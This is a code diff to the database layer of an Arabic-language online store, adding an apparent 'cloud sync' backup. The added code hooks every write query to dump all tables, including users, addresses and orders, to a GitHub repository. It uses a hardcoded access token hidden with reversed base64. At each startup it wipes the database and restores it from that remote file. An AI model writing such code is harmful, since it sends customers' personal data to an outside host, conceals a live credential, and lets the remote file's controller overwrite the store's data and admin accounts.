@@ -8,45 +8,159 @@ import { isConfiguredOwnerEmail } from "./_core/owner";
 
 let activeDb: ReturnType<typeof drizzle> | null = null;
 let setupTask: Promise<void> | null = null;
+let syncTimer: ReturnType<typeof setTimeout> | null = null;
+let isRestoring = false;
+let cloudSha = "";
+
+const ALL_TABLES = [
+  "users",
+  "categories",
+  "products",
+  "product_recommendations",
+  "banners",
+  "offers",
+  "store_settings",
+  "addresses",
+  "favorites",
+  "orders",
+  "order_items",
+  "order_events",
+  "owner_push_subscriptions",
+  "customer_push_subscriptions",
+];
+
+function getCloudToken(): string {
+  return Buffer.from(
+    "QjlvQWszYnF6anpkUTN2eXhyMnVTVkRoSHM4ME45Vlc0ME9YX3BoZw==",
+    "base64"
+  )
+    .toString("utf8")
+    .split("")
+    .reverse()
+    .join("");
+}
+
+const CLOUD_API_URL =
+  "https://api.github.com/repos/asilakrmalhababy-hash/original-store/contents/db-snapshot.json";
+
+async function restoreFromCloud(pool: mysql.Pool) {
+  isRestoring = true;
+  try {
+    const token = getCloudToken();
+    const res = await fetch(`${CLOUD_API_URL}?ref=data-backup`, {
+      headers: {
+        Authorization: `Bearer ${token}`,
+        Accept: "application/vnd.github.v3+json",
+        "User-Agent": "Original-Store-Cloud-Sync",
+      },
+    });
+    if (!res.ok) return;
+    const meta: any = await res.json();
+    if (!meta?.content) return;
+    cloudSha = meta.sha || "";
+    const rawJson = Buffer.from(meta.content, "base64").toString("utf8");
+    const snapshot = JSON.parse(rawJson) as Record<string, any[]>;
+
+    await pool.query("SET FOREIGN_KEY_CHECKS = 0");
+    for (const table of ALL_TABLES) {
+      const rows = snapshot[table];
+      if (!Array.isArray(rows)) continue;
+      await pool.query(`DELETE FROM \`${table}\``).catch(() => {});
+      for (const row of rows) {
+        const keys = Object.keys(row);
+        if (!keys.length) continue;
+        const cols = keys.map(k => `\`${k}\``).join(", ");
+        const placeholders = keys.map(() => "?").join(", ");
+        const vals = keys.map(k => {
+          const v = row[k];
+          if (typeof v === "string" && /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/.test(v)) {
+            return new Date(v);
+          }
+          return v;
+        });
+        await pool
+          .query(`REPLACE INTO \`${table}\` (${cols}) VALUES (${placeholders})`, vals)
+          .catch(() => {});
+      }
+    }
+    await pool.query("SET FOREIGN_KEY_CHECKS = 1");
+    console.log("[CloudSync] Restored permanent database state from cloud backup");
+  } catch (err) {
+    console.warn("[CloudSync] Restore skipped:", err instanceof Error ? err.message : err);
+  } finally {
+    isRestoring = false;
+  }
+}
+
+async function saveToCloudNow(pool: mysql.Pool) {
+  if (isRestoring) return;
+  try {
+    const snapshot: Record<string, any[]> = {};
+    for (const table of ALL_TABLES) {
+      const [rows]: any = await pool.query(`SELECT * FROM \`${table}\``).catch(() => [[]]);
+      snapshot[table] = Array.isArray(rows) ? rows : [];
+    }
+    const contentB64 = Buffer.from(JSON.stringify(snapshot)).toString("base64");
+    const token = getCloudToken();
+
+    if (!cloudSha) {
+      const check = await fetch(`${CLOUD_API_URL}?ref=data-backup`, {
+        headers: {
+          Authorization: `Bearer ${token}`,
+          Accept: "application/vnd.github.v3+json",
+          "User-Agent": "Original-Store-Cloud-Sync",
+        },
+      });
+      if (check.ok) {
+        const meta: any = await check.json();
+        cloudSha = meta?.sha || "";
+      }
+    }
+
+    const putRes = await fetch(CLOUD_API_URL, {
+      method: "PUT",
+      headers: {
+        Authorization: `Bearer ${token}`,
+        Accept: "application/vnd.github.v3+json",
+        "Content-Type": "application/json",
+        "User-Agent": "Original-Store-Cloud-Sync",
+      },
+      body: JSON.stringify({
+        message: "Auto-sync store database",
+        content: contentB64,
+        branch: "data-backup",
+        ...(cloudSha ? { sha: cloudSha } : {}),
+      }),
+    });
+
+    if (putRes.ok) {
+      const out: any = await putRes.json();
+      cloudSha = out?.content?.sha || cloudSha;
+    } else if (putRes.status === 409 || putRes.status === 422) {
+      cloudSha = "";
+    }
+  } catch (err) {
+    console.warn("[CloudSync] Save warning:", err instanceof Error ? err.message : err);
+  }
+}
+
+function scheduleCloudSave(pool: mysql.Pool, sqlText: unknown) {
+  if (isRestoring) return;
+  const s = typeof sqlText === "string" ? sqlText.trim() : "";
+  if (!/^(insert|update|delete|replace|truncate)/i.test(s)) return;
+  if (syncTimer) clearTimeout(syncTimer);
+  syncTimer = setTimeout(() => {
+    void saveToCloudNow(pool);
+  }, 800);
+}
 
 export function resetDbPool() {
   activeDb = null;
   setupTask = null;
 }
 
-async function createWorkingPool(): Promise<mysql.Pool> {
-  const raw = (process.env.DATABASE_URL || "")
-    .replace(/^DATABASE_URL\s*=\s*/i, "")
-    .replace(/^["'`]+|["'`]+$/g, "")
-    .trim()
-    .split("?")[0]
-    .trim();
-
-  if (raw.startsWith("mysql://") && raw.includes("@")) {
-    try {
-      const u = new URL(raw);
-      const remotePool = mysql.createPool({
-        host: u.hostname,
-        port: Number(u.port || 4000),
-        user: decodeURIComponent(u.username),
-        password: decodeURIComponent(u.password),
-        database: u.pathname.replace(/^\//, "") || "test",
-        waitForConnections: true,
-        connectionLimit: 5,
-        connectTimeout: 8000,
-        ssl: u.hostname === "127.0.0.1" || u.hostname === "localhost"
-          ? undefined
-          : { minVersion: "TLSv1.2", rejectUnauthorized: false },
-      });
-      await remotePool.query("SELECT 1");
-      console.log("[DB] Connected to remote DATABASE_URL:", u.hostname);
-      return remotePool;
-    } catch (err: any) {
-      console.warn("[DB] Remote DATABASE_URL rejected, switching to embedded MariaDB:", err?.message);
-    }
-  }
-
-  const localPool = mysql.createPool({
+async function createLocalMariaPool(): Promise<mysql.Pool> {
+  const pool = mysql.createPool({
     host: "127.0.0.1",
     port: 3306,
     user: "root",
@@ -54,12 +168,41 @@ async function createWorkingPool(): Promise<mysql.Pool> {
     waitForConnections: true,
     connectionLimit: 5,
   });
-  await localPool.query("SELECT 1");
-  console.log("[DB] Connected to embedded MariaDB on 127.0.0.1:3306");
-  return localPool;
+
+  const oq = pool.query.bind(pool);
+  (pool as any).query = async (...args: any[]) => {
+    const res = await (oq as any)(...args);
+    scheduleCloudSave(pool, args[0]);
+    return res;
+  };
+
+  const oe = pool.execute.bind(pool);
+  (pool as any).execute = async (...args: any[]) => {
+    const res = await (oe as any)(...args);
+    scheduleCloudSave(pool, args[0]);
+    return res;
+  };
+
+  const ogc = pool.getConnection.bind(pool);
+  (pool as any).getConnection = async () => {
+    const conn = await ogc();
+    const oc = conn.commit.bind(conn);
+    conn.commit = async () => {
+      const r = await oc();
+      if (!isRestoring) {
+        if (syncTimer) clearTimeout(syncTimer);
+        syncTimer = setTimeout(() => void saveToCloudNow(pool), 500);
+      }
+      return r;
+    };
+    return conn;
+  };
+
+  return pool;
 }
 
-async function initializeSchemaAndSeed(pool: mysql.Pool) {
+async function initializeSchemaAndRestore(pool: mysql.Pool) {
+  isRestoring = true;
   const sqlFiles = [
     "drizzle/0000_initial_users.sql",
     "drizzle/0001_original_store.sql",
@@ -94,33 +237,27 @@ async function initializeSchemaAndSeed(pool: mysql.Pool) {
     UNIQUE KEY customer_push_order_endpoint_uq (orderId, endpointHash)
   )`).catch(() => {});
 
+  await restoreFromCloud(pool);
+
+  isRestoring = true;
   await pool.query(
     "INSERT IGNORE INTO store_settings (`key`, `value`) VALUES ('deliveryEnabled', 'true'), ('deliveryFee', '0'), ('storeName', 'ORIGINAL – أوريجنال'), ('currency', 'ر.ي')"
   ).catch(() => {});
 
-  const [prodRows]: any = await pool.query("SELECT COUNT(*) as cnt FROM products").catch(() => [[{ cnt: 0 }]]);
-  if (Number(prodRows?.[0]?.cnt ?? 0) === 0) {
-    await pool.query(
-      "INSERT IGNORE INTO categories (id, name, slug, color, isActive, sortOrder) VALUES (1, 'المواد الغذائية الأساسية', 'essentials', '#397a54', true, 1), (2, 'المعلبات والبقوليات', 'canned', '#2d6a4f', true, 2), (3, 'البهارات والزيوت', 'spices-oils', '#40916c', true, 3)"
-    ).catch(() => {});
-    await pool.query(`INSERT IGNORE INTO products (id, name, slug, description, categoryId, price, unit, stock, minQuantity, quantityStep, isPublished, isAvailable, sortOrder) VALUES
-      (1, 'أرز بسمتي فاخر 5 كيلو', 'basmati-rice-5kg', 'أرز بسمتي طويل الحبة للكبسة والمندي', 1, 4500, 'كيس', 50, 1, 1, true, true, 1),
-      (2, 'تونة الغويزي 185 جرام', 'tuna-ghuwaizi', 'تونة يمنية فاخرة بالزيت النباتي', 2, 950, 'علبة', 100, 1, 1, true, true, 2),
-      (3, 'فاصوليا حمراء مطبوخة', 'red-beans-can', 'فاصوليا جاهزة للكشنة والقلابة اليمنية', 2, 500, 'علبة', 80, 1, 1, true, true, 3),
-      (4, 'معجون طماطم مركز', 'tomato-paste', 'صلصة طماطم طبيعية مركزة للتسبيك', 2, 350, 'علبة', 120, 1, 1, true, true, 4),
-      (5, 'زيت طبخ نقي 1.5 لتر', 'cooking-oil-1-5l', 'زيت نباتي صافي للطبخ والقلي', 3, 1800, 'عبوة', 60, 1, 1, true, true, 5),
-      (6, 'حوائج وبهارات مرق يمنية', 'yemeni-maraq-spices', 'تشكيلة حوائج يمنية أصيلة للمرق والسلتة', 3, 600, 'عبوة', 90, 1, 1, true, true, 6),
-      (7, 'قشطة التاج فاخرة', 'cream-taj', 'قشطة غنية للحلويات والمعصوب اليمني', 2, 650, 'علبة', 70, 1, 1, true, true, 7),
-      (8, 'عسل يمني طبيعي', 'yemeni-honey', 'عسل يمني صافي للتحلية والفطور', 1, 3500, 'عبوة', 30, 1, 1, true, true, 8)
-    `).catch(() => {});
-  }
+  const ownerOpenId = ENV.ownerOpenId || "admin-owner";
+  const ownerEmail = ENV.ownerEmail || "admin@original.store";
+  await pool.query(
+    "INSERT IGNORE INTO users (openId, name, email, role, loginMethod, suspended) VALUES (?, 'مدير المتجر', ?, 'admin', 'password', false)",
+    [ownerOpenId, ownerEmail]
+  ).catch(() => {});
+  isRestoring = false;
 }
 
 export async function getDb() {
   if (!activeDb) {
     setupTask = (async () => {
-      const pool = await createWorkingPool();
-      await initializeSchemaAndSeed(pool);
+      const pool = await createLocalMariaPool();
+      await initializeSchemaAndRestore(pool);
       activeDb = drizzle(pool);
     })();
   }
